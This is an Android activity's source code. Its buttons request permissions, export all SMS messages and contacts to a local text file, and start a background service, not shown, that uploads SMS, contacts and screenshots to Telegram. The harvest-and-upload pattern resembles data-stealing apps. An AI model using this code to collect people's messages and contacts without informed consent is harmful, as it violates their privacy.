package com.csu.web2app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";

    private enum ExportType { SMS, CONTACTS, SCREENSHOTS, ALL }
    private ExportType pendingExportType;

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private final ActivityResultLauncher<String> requestPermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -> {
                if (isGranted) {
                    if (pendingExportType == ExportType.SMS) {
                        startSmsExport();
                    } else if (pendingExportType == ExportType.CONTACTS) {
                        startContactsExport();
                    } else if (pendingExportType == ExportType.SCREENSHOTS) {
                        sendScreenshotsToTelegram();
                    }
                } else {
                    String type = "permission";
                    if (pendingExportType == ExportType.SMS) type = "SMS";
                    else if (pendingExportType == ExportType.CONTACTS) type = "contacts";
                    else if (pendingExportType == ExportType.SCREENSHOTS) type = "images";
                    Toast.makeText(this, "Permission denied to read " + type, Toast.LENGTH_SHORT).show();
                }
            });

    private final ActivityResultLauncher<Intent> createFileLauncher =
            registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
                if (result.getResultCode() == RESULT_OK && result.getData() != null) {
                    Uri uri = result.getData().getData();
                    if (uri != null) {
                        saveToFileInBackground(uri, pendingExportType);
                    }
                }
            });

    private final ActivityResultLauncher<String[]> requestMultiplePermissionsLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
                boolean allGranted = true;
                for (Map.Entry<String, Boolean> entry : result.entrySet()) {
                    if (!entry.getValue()) {
                        allGranted = false;
                        break;
                    }
                }

                if (allGranted) {
                    if (pendingExportType == ExportType.ALL) {
                        sendAllToTelegram();
                    }
                } else {
                    Toast.makeText(this, "Permissions denied. Some features may not work.", Toast.LENGTH_SHORT).show();
                }
            });

    private final ActivityResultLauncher<String> requestNotificationPermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -> {
                if (isGranted) {
                    // Notification permission granted, we can proceed with starting the service
                    if (pendingExportType == ExportType.ALL) {
                        sendAllToTelegram();
                    } else if (pendingExportType == ExportType.SCREENSHOTS) {
                        sendScreenshotsToTelegram();
                    }
                } else {
                    Toast.makeText(this, "Notification permission denied. Background upload might not work correctly.", Toast.LENGTH_SHORT).show();
                }
            });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnDownloadSms = findViewById(R.id.btn_download_sms);
        btnDownloadSms.setOnClickListener(v -> {
            pendingExportType = ExportType.SMS;
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                startSmsExport();
            } else {
                requestPermissionLauncher.launch(Manifest.permission.READ_SMS);
            }
        });

        Button btnDownloadContacts = findViewById(R.id.btn_download_contacts);
        btnDownloadContacts.setOnClickListener(v -> {
            pendingExportType = ExportType.CONTACTS;
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                startContactsExport();
            } else {
                requestPermissionLauncher.launch(Manifest.permission.READ_CONTACTS);
            }
        });

        Button btnSendScreenshots = findViewById(R.id.btn_send_screenshots);
        btnSendScreenshots.setOnClickListener(v -> {
            pendingExportType = ExportType.SCREENSHOTS;
            String permission = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
                    Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE;

            if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
                sendScreenshotsToTelegram();
            } else {
                requestPermissionLauncher.launch(permission);
            }
        });

        Button btnSendAll = findViewById(R.id.btn_send_all);
        btnSendAll.setOnClickListener(v -> {
            pendingExportType = ExportType.ALL;
            String imagePermission = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
                    Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE;

            List<String> permissionsList = new ArrayList<>();
            permissionsList.add(Manifest.permission.READ_SMS);
            permissionsList.add(Manifest.permission.READ_CONTACTS);
            permissionsList.add(imagePermission);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissionsList.add(Manifest.permission.POST_NOTIFICATIONS);
            }

            String[] permissions = permissionsList.toArray(new String[0]);

            boolean allGranted = true;
            for (String p : permissions) {
                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                sendAllToTelegram();
            } else {
                requestMultiplePermissionsLauncher.launch(permissions);
            }
        });
    }

    private void startSmsExport() {
        createFile("my_sms_backup.txt");
    }

    private void startContactsExport() {
        createFile("my_contacts_backup.txt");
    }

    private void sendAllToTelegram() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                pendingExportType = ExportType.ALL;
                requestNotificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS);
                return;
            }
        }
        Intent intent = new Intent(this, UploadService.class);
        intent.setAction(UploadService.ACTION_UPLOAD_ALL);
        ContextCompat.startForegroundService(this, intent);
        Toast.makeText(this, "Started background upload of all data", Toast.LENGTH_SHORT).show();
    }

    private void createFile(String title) {
        Intent intent = new Intent(Intent.ACTION_CREATE_DOCUMENT);
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        intent.setType("text/plain");
        intent.putExtra(Intent.EXTRA_TITLE, title);
        createFileLauncher.launch(intent);
    }

    private void saveToFileInBackground(Uri uri, ExportType type) {
        executorService.execute(() -> {
            boolean success = false;
            try (OutputStream outputStream = getContentResolver().openOutputStream(uri)) {
                if (outputStream != null) {
                    if (type == ExportType.SMS) {
                        writeSmsToStream(outputStream);
                    } else if (type == ExportType.CONTACTS) {
                        writeContactsToStream(outputStream);
                    }
                    success = true;
                }
            } catch (IOException | IllegalArgumentException e) {
                e.printStackTrace();
            }

            final boolean finalSuccess = success;
            mainHandler.post(() -> {
                if (finalSuccess) {
                    String message = type == ExportType.SMS ? "SMS saved successfully" : "Contacts saved successfully";
                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                } else {
                    String message = type == ExportType.SMS ? "Failed to save SMS" : "Failed to save contacts";
                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                }
            });
        });
    }

    private void writeSmsToStream(OutputStream outputStream) throws IOException {
        Uri uriSms = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        String[] projection = new String[]{"address", "body", "date"};
        try (Cursor cursor = cr.query(uriSms, projection, null, null, "date DESC")) {
            if (cursor != null && cursor.moveToFirst()) {
                int indexAddress = cursor.getColumnIndexOrThrow("address");
                int indexBody = cursor.getColumnIndexOrThrow("body");
                int indexDate = cursor.getColumnIndexOrThrow("date");

                do {
                    String address = cursor.getString(indexAddress);
                    String body = cursor.getString(indexBody);
                    String date = cursor.getString(indexDate);

                    StringBuilder sb = new StringBuilder();
                    sb.append("From: ").append(address).append("\n");
                    sb.append("Date: ").append(new java.util.Date(Long.parseLong(date))).append("\n");
                    sb.append("Message: ").append(body).append("\n");
                    sb.append("----------------------------------\n");

                    outputStream.write(sb.toString().getBytes());
                } while (cursor.moveToNext());
            }
        }
    }

    private void writeContactsToStream(OutputStream outputStream) throws IOException {
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        ContentResolver cr = getContentResolver();

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        try (Cursor cursor = cr.query(uri, projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            if (cursor != null && cursor.moveToFirst()) {
                int indexName = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int indexNumber = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER);

                do {
                    String name = cursor.getString(indexName);
                    String number = cursor.getString(indexNumber);

                    StringBuilder sb = new StringBuilder();
                    sb.append("Name: ").append(name).append("\n");
                    sb.append("Phone: ").append(number).append("\n");
                    sb.append("----------------------------------\n");

                    outputStream.write(sb.toString().getBytes());
                } while (cursor.moveToNext());
            }
        }
    }

    private void sendScreenshotsToTelegram() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                pendingExportType = ExportType.SCREENSHOTS;
                requestNotificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS);
                return;
            }
        }
        Intent intent = new Intent(this, UploadService.class);
        intent.setAction(UploadService.ACTION_UPLOAD_SCREENSHOTS);
        ContextCompat.startForegroundService(this, intent);
        Toast.makeText(this, "Started background upload of screenshots", Toast.LENGTH_SHORT).show();
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
        executorService.shutdown();
    }
}
